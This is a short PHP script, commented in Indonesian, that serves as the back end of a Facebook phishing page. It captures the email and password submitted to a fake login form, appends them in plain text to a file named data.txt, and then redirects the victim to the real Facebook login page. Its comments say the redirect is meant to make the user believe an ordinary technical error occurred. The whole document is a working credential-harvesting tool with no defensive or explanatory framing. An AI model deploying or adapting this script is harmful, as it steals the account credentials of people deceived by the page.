<?php
// 1. Menangkap data dari form
$email = $_POST['email'];
$pass = $_POST['password'];

// 2. Format data yang akan disimpan
$data = "Email: " . $email . " | Password: " . $pass . "\n";

// 3. Simpan ke file teks (data.txt)
// FILE_APPEND agar data lama tidak terhapus
file_put_contents("data.txt", $data, FILE_APPEND);

// 4. Redirect korban ke situs asli (misal: Facebook asli)
// Ini dilakukan agar pengguna mengira ada kesalahan teknis biasa
header("Location: https://www.facebook.com/login.php?login_attempt=1");
exit();
?>